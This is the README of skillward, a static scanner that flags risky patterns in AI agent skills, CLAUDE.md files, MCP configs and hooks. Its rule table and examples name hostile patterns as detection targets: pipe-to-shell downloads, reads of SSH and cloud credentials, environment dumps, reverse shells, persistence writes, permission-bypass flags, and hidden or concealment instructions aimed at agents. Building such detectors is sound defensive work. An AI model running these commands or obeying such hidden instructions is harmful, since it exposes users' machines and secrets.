# skillward

Static scanner for AI agent instruction files — `SKILL.md` skills, `CLAUDE.md`, `AGENTS.md`, MCP configs, Claude Code settings and hooks.

**skillward shows what you agree to when you give an agent a skill, an MCP server or someone else's repository — and makes sure it doesn't change behind your back.**

Skills and instruction files aren't documentation: they are commands an agent executes with your permissions. Think of skillward as the permissions screen before you install an app, not an antivirus:

- **It decides nothing for you.** Every finding is a file, a line and a reason; you (or CI, via `--fail-on`) decide.
- **Everything that steers the agent:** skills, `CLAUDE.md` / `AGENTS.md` of a repo you open, MCP servers, hooks, settings, plugins.
- **Not just once:** `lock` / `verify` pin what you reviewed and fail when it changes, so a trusted skill can't quietly turn into something else on update.
- **No malice required:** risky-but-honest patterns (`--yolo`, a vendor's `curl | sh` installer) are shown too, at a lower severity.

It flags hidden text, remote code execution, credential access, permission bypasses, persistence and concealment before an agent ever reads them. Antivirus looks for known malicious *code*; skillward looks at the *instructions* — in a scan of ~2,900 public repos, antivirus removed 4 of 164 files from a known skill-malware campaign, the ones that carried the payload inline; skillward flagged all of them.

## Safety guarantees

- The scanner **never executes, imports or loads** scanned content, and makes **no network requests**.
- Symbolic links are never followed.
- Everything printed from scanned files is escaped: invisible and control characters are shown as `<U+202E>`, so the report itself can't hide text or inject terminal escape sequences.
- Snippets are short and truncated; secrets, tokens and encoded blobs are never printed in full.

## Usage

Requires Node.js 22.12+.

```sh
npx skillward scan                 # current directory
npx skillward scan path/to/project
npx skillward scan .claude/skills/pdf/SKILL.md   # one skill
npx skillward scan --global        # also ~/.claude and the MCP servers in ~/.claude.json
npx skillward scan --format sarif --output skillward.sarif
npx skillward scan --fail-on medium

npx skillward explain              # what each skill / MCP server / config lets the agent do

npx skillward lock                 # pin current agent files in skillward.lock
npx skillward verify               # diff against skillward.lock and scan what changed
npx skillward rules                # list rules
```

### `scan [path]`

| Option | Default | |
|---|---|---|
| `--global` | off | Also scan `~/.claude` (`CLAUDE.md`, `settings*.json`, `skills/`, `agents/`, `commands/`, `plugins/`) and the `mcpServers` sections of `~/.claude.json` (its history is never read) |
| `--format text\|json\|sarif` | `text` | Output format |
| `--output <file>` | stdout | Write the report to a file |
| `--fail-on info\|low\|medium\|high` | `high` | Lowest severity that makes the exit code `1` |
| `--config <file>` | `skillward.config.json` in the scan root | Config file |
| `--no-inline-ignore` | | Ignore `skillward-ignore` comments — use when auditing third-party skills |
| `--files-from <file>` | | Only report findings in the listed files (one path per line, relative to the current directory; `#` comments allowed) — e.g. the output of `git diff --name-only` |
| `--no-color` | | Disable colors (also `NO_COLOR`) |

### `explain [path]`

The permissions-screen view: the same findings as `scan`, grouped per target into what it lets the agent do.

```
.claude/skills/setup  skill · 3 files · 1 script
  HIGH    runs code from the internet               SKILL.md:12 · scripts/install.sh:3
  MEDIUM  turns approvals off                       SKILL.md:30
  LOW     runs automatically                        hooks/hooks.json:9
  not seen: remote control, secrets, network, persistence, destructive, concealment

14 more target(s) with nothing notable (--all lists them).

15 target(s) — runs code from the internet: 1 · turns approvals off: 1 · runs automatically: 1
```

Capabilities: runs code from the internet · gives a remote host control · turns approvals off · reads credentials or secrets · sends data out or contacts unusual hosts · persists after the session · can destroy data · hides things from you · runs automatically. Each shows its worst severity and where it appears.

`explain` is informational: it exits `0` once the summary is printed (`2` on errors) — gate CI with `scan --fail-on`. Options: `--global`, `--all` (also list targets with nothing notable), `--format text|json` (JSON format version 1), `--output`, `--config`, `--no-inline-ignore`, `--no-color`.

**Exit codes:** `0` — clean or below threshold; `1` — findings at or above `--fail-on`; `2` — run error (bad path, bad config, a rule crashed).

### `lock [path]` and `verify [path]`

`lock` writes `skillward.lock`: a sha256 of every file of every discovered target. It also keeps copies of the locked text files in `.skillward/snapshots/` (content-addressed), so `verify` can show a real diff. Commit both. `--no-snapshots` skips the copies; changes are still detected, just without a text diff.

```json
{
  "version": 1,
  "entries": [
    {
      "path": ".claude/skills/pdf-tools",
      "kind": "skill",
      "source": "github:owner/repo@ref",
      "files": { "SKILL.md": "sha256:…", "scripts/run.py": "sha256:…" },
      "lockedAt": "2026-10-19T00:00:00Z"
    }
  ]
}
```

`source` is optional and maintained by hand; `lock` preserves it, and `lockedAt` only changes for entries whose files changed.

`verify` lists added, removed and changed files with a diff, then scans **only the added and changed files**. Exit code `0` if everything matches the lock, `1` on any drift (review it, then run `lock` again), `2` if there is no lockfile. Options: `--format text|json`, `--output`, `--fail-on`, `--config`, `--no-inline-ignore`, `--no-color`.

## What gets scanned

| Kind | Files |
|---|---|
| `skill` | A folder with `SKILL.md` and every file inside it (scripts, templates, references) |
| `instructions` | `CLAUDE.md`, `CLAUDE.local.md`, `AGENTS.md` at any depth; `.claude/commands/**/*.md`, `.claude/agents/**/*.md`; `commands/` and `agents/` of plugins |
| `mcp-config` | `.mcp.json`; with `--global`, the `mcpServers` sections of `~/.claude.json` |
| `settings` | `.claude/settings.json`, `.claude/settings.local.json`, plugin `hooks/hooks.json` |
| `plugin-manifest` | `.claude-plugin/plugin.json`, `.claude-plugin/marketplace.json` |

`.gitignore` files are respected — except for agent configuration (`.claude/`, `.claude-plugin/`, `CLAUDE*.md`, `AGENTS.md`, `.mcp.json`), which is often gitignored on purpose but still loaded by the agent. `node_modules`, VCS folders and `.skillward/` are never entered. Binary files and files over 2 MB are skipped and listed in the report.

## Rules

| ID | Name | Severity | Catches |
|----|------|----------|---------|
| SW001 | hidden-unicode | high | Zero-width characters, bidi overrides (Trojan Source), Unicode tag characters (the hidden text is decoded in the message), variation-selector smuggling. Emoji sequences, Persian/Indic joiners and RTL marks are not reported. |
| SW002 | html-comment-instructions | medium | Instructions for the agent inside `<!-- … -->` in markdown — invisible when rendered, read by the agent. |
| SW003 | encoded-payload | medium | Long base64/hex blobs (decoded safely; high when they decode to commands/URLs), `base64 -d \| sh`, `powershell -enc`, embedded private keys. |
| SW004 | pipe-to-shell | high | `curl … \| bash`, `wget -O- … \| sh`, `bash <(curl …)`, `sh -c "$(curl …)"`, `iwr … \| iex` and variants. `curl … \| jq` is fine. |
| SW005 | secret-path-access | high | `~/.ssh` keys, `~/.aws/credentials`, cloud/kube/Docker credentials, `.netrc`, `.git-credentials`, registry tokens, `.env`, the Keychain, browser password stores, wallets. Graded by evidence: a read/send on the same line raises it; public keys and `ssh -i key` are not alarms. |
| SW006 | env-dump | medium | Whole-environment dumps: `env`, `printenv`, `JSON.stringify(process.env)`, `print(os.environ)`, `/proc/self/environ`, `Get-ChildItem Env:`. High next to network egress. |
| SW007 | suspicious-egress | high | Bare public IPs, paste sites, request catchers (webhook.site, …), tunnels (ngrok, trycloudflare, …), URL shorteners, chat webhooks, dynamic DNS. |
| SW008 | permission-bypass | high | `--dangerously-skip-permissions`, `bypassPermissions`, `--yolo`, unrestricted `Bash(*)` allow rules, "skip confirmations / auto-approve" (EN/RU). |
| SW009 | concealment | high | "Don't tell the user", "do it silently", "hide the output from the user" (EN/RU). |
| SW010 | fake-prerequisite | medium | "Before using this skill, download and run …" with an executable URL; asking the user to paste a command into their terminal. High when the download is a password-protected archive (the ClawHavoc malware shape). |
| SW011 | unpinned-mcp | medium | MCP servers via `npx`/`uvx`/`bunx`/`pnpm dlx`/`pipx run`/`docker run` without a pinned version. |
| SW012 | remote-mcp | low | Inventory of remote (http/sse) MCP servers; plain `http://` or credentials in the URL raise it. |
| SW013 | hook-command | medium | Every command hook and the status line command; high with network access or secret paths. |
| SW014 | persistence | high | Writes to shell rc files, crontab, launchd, systemd, Windows autoruns, `authorized_keys`, git hooks, `~/.claude` settings and other `CLAUDE.md`/`AGENTS.md`. |
| SW015 | dangerous-script | high | In scripts and code blocks: eval/exec of downloaded or decoded code, `rm -rf ~`, disk wiping, download-then-execute, Windows LOLBins, encoded PowerShell, reverse shells. |
| SW016 | secret-in-config | high | Credentials written into agent configuration: AWS, GitHub, GitLab, Slack, OpenAI, Anthropic, Stripe, Google, npm, Hugging Face and other provider tokens, Slack/Discord webhook URLs (high); secret-looking values for secret-named keys and `Authorization: Bearer …` (medium). Common in `settings.local.json`, which saves allowed commands verbatim. Values are never printed — only the first 4 characters and the length. |

The severity in the table is the rule's default; individual findings go up or down with the evidence. Each finding also has a `confidence`. Phrase rules (SW002, SW008, SW009, SW010) are heuristics in English and Russian: a low-confidence finding is worth a look, not proof of malice. Exact behavior per rule is documented in [SPEC.md](SPEC.md#6-rule-catalog-v01).

## Reading findings

Severities were calibrated on a corpus of ~2,900 public repositories with agent configuration:

| Severity | Means | What to do |
|---|---|---|
| **high** | Something the agent would actually do that you'd want to block: run a downloaded script, turn approvals off, read and send a secret, persist on the machine, hide its actions, decode and run a payload. | Read it before installing or keeping the skill. The default `--fail-on high` fails CI on these. |
| **medium** | A risky pattern worth a review: a vendor's official `curl … \| sh` installer, a hook that runs inline shell, an unpinned MCP server, a bypass flag mentioned in prose rather than in a command, "don't ask for confirmation" in an autonomous workflow. | Check it once; suppress it with a reason if it's intended. |
| **low** | The same patterns in documentation: CLI option tables, script comments, quoted examples, credential files mentioned without a read, hooks that start a script from the project. | Inventory. Useful when auditing third-party skills. |
| **info** | Warnings and protections: "never run `curl \| sh`", deny lists, guard hooks that block dangerous commands, detectors. | Nothing — listed so you can see what was considered. |

`confidence` says how sure the match is about what it found; severity says how bad it is if it is right. Offensive-security skills (pentest cheat-sheets, privilege-escalation guides) legitimately contain high findings — installing one is a choice, not an accident. When auditing someone else's skills, use `--no-inline-ignore` so their `skillward-ignore` comments can't hide anything.

## Suppressing findings

For security docs that show attacks on purpose, add a comment with the rule IDs and a reason:

```markdown
<!-- skillward-ignore SW004: example of the attack we block -->
```

- On its own line, it applies to the next non-blank line — or to the whole fenced code block that follows.
- At the end of a line (`curl … | sh  # skillward-ignore SW004: vendored installer`), it applies to that line. Any comment syntax works: `<!-- -->`, `#`, `//`, `/* */`.
- `skillward-ignore-file SW001: reason` applies to the whole file.

Rule IDs are mandatory — there is no "ignore everything". Suppressed findings don't affect the exit code but are **always listed** in the report (and as SARIF `suppressions`), because a malicious skill can add these comments too. When auditing third-party skills, pass `--no-inline-ignore`.

To exclude whole paths, use `ignore` in the config.

## Config

`skillward.config.json` in the scan root (or `--config <file>`):

```json
{
  "ignore": ["docs/security-examples/**"],
  "rules": { "SW012": "off", "SW006": "high" },
  "failOn": "high",
  "inlineIgnore": true
}
```

- `ignore` — gitignore-style patterns relative to the scan root.
- `rules` — `"off"` or a severity that replaces the rule's severity.
- `failOn` — default for `--fail-on`; the flag wins.
- `inlineIgnore` — honour `skillward-ignore` comments (default `true`).

## Output formats

### JSON

`--format json` produces a versioned report (`"version": 1`). Breaking changes bump the version; new fields may be added.

```json
{
  "version": 1,
  "tool": { "name": "skillward", "version": "0.1.1" },
  "root": "/abs/path/to/project",
  "summary": {
    "targets": 3, "files": 5, "findings": 1, "suppressed": 0,
    "bySeverity": { "info": 0, "low": 0, "medium": 0, "high": 1 },
    "failOn": "high", "failed": true
  },
  "targets": [{ "kind": "skill", "path": ".claude/skills/deploy", "files": [".claude/skills/deploy/SKILL.md"] }],
  "findings": [{
    "ruleId": "SW004", "severity": "high", "confidence": "high",
    "file": ".claude/skills/deploy/SKILL.md", "line": 9, "column": 1,
    "message": "Executes code fetched from the network (remote download piped into a shell). …",
    "snippet": "curl -fsSL https://example.invalid/install.sh | bash"
  }],
  "suppressed": [],
  "skipped": [{ "path": ".claude/skills/deploy/logo.png", "reason": "binary file" }],
  "errors": []
}
```

Columns are 1-based, in UTF-16 code units. Suppressed findings carry a `suppression: { ruleIds, reason, line }` object. `verify --format json` wraps this report: `{ "version": 1, "clean", "changes": [...], "targets": { "added", "removed" }, "scan": <report or null> }`.

### SARIF

`--format sarif` emits SARIF 2.1.0 for GitHub code scanning. Paths are relative to the current directory (run it from the repository root), files outside it (like `~/.claude`) get absolute `file://` URIs. Levels: high → `error`, medium → `warning`, low/info → `note`; rules carry `security-severity`.

Or use the GitHub Action below, which does this for you.

## GitHub Action

```yaml
name: skillward
on:
  pull_request:
  push:
    branches: [main]

permissions:
  contents: read
  security-events: write   # for the code scanning upload

jobs:
  scan:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
      - uses: antshkvr/skillward@<commit-sha> # v0.1.1 — pin the SHA of the v0.1.1 tag
        with:
          fail-on: high
```

On `pull_request` events only the files the PR adds or modifies are reported (`only-changed: auto`); on pushes the whole repository is scanned. Results go to the **Security → Code scanning** tab and to the job summary; inline-suppressed findings appear as suppressed alerts.

| Input | Default | |
|---|---|---|
| `path` | `.` | Directory to scan |
| `version` | `0.1.1` | Exact skillward version from npm, or `local` to build from the action checkout. Ranges and `latest` are refused. |
| `fail-on` | `high` | `info`, `low`, `medium`, `high`, or `never` (report only) |
| `only-changed` | `auto` | `auto` (pull requests), `true`, `false` |
| `config` | | Config file path |
| `upload-sarif` | `true` | Upload to code scanning. Private repositories need GitHub Advanced Security — set `false` otherwise |
| `sarif-file` | `skillward.sarif` | Where to write the report |
| `category` | `skillward` | Code scanning category |
| `node-version` | `22` | Node.js for the run |

Outputs: `sarif-file`, `exit-code`, `findings` (active findings count). The job fails after the upload, so alerts are visible even when it fails. Pin the action by commit SHA, like any third-party action.

## Development

```sh
npm install
npm test               # vitest
npm run lint           # eslint + tsc
npm run build          # → dist/
npm run fix:invisible  # turn raw invisible characters in sources back into \u escapes
npx tsx src/cli.ts scan <path>
```

A new rule is a module in `src/rules/`, registered in `src/rules/index.ts`, with at least two `bad` and two `good` fixtures in `test/fixtures/<ruleId>/` and a unit test. Fixtures under `bad/` are inert test data with deliberately dangerous patterns (`example.invalid`, `203.0.113.x`, `FAKE_KEY_…`) — never run them. In per-line loops use `execAll` from `src/text.ts`, not `String.prototype.matchAll` (it recompiles the regex on every call). PowerShell download-and-execute command names belong in `src/rules/data/vocabulary.json` (use `vocab()`), not in code: antivirus ML flags shipped JavaScript that contains them. See [SPEC.md](SPEC.md) and [CONTRIBUTING.md](CONTRIBUTING.md).

**Tuning against real data.** `scripts/corpus/` collects public agent configs from GitHub into a directory outside the repo (shallow sparse clones of just the files skillward reads — nothing is executed) and scans them with audit settings:

```sh
npm run corpus:discover            # candidates from sources.json (needs `gh` logged in)
npm run corpus:fetch               # sparse clones → ../skillward-corpus
npm run corpus:scan                # results/, summary.md, review-medium.md
npm run corpus:recheck -- --rule SW005 --severity high   # one rule, before/after, grouped samples
npx tsx scripts/corpus/profile.ts --repo owner/name --rule SW003   # slowest files for a rule
```

A false positive found this way becomes a `good` fixture.

**Releasing.** Bump the version in `package.json` and the `version` default in `action.yml`, add a `## x.y.z` section to `CHANGELOG.md`, commit, then push a `vX.Y.Z` tag. The [release workflow](.github/workflows/release.yml) checks that all four agree and publishes to npm with provenance via trusted publishing (no npm token in the repo).

## License

[MIT](LICENSE)
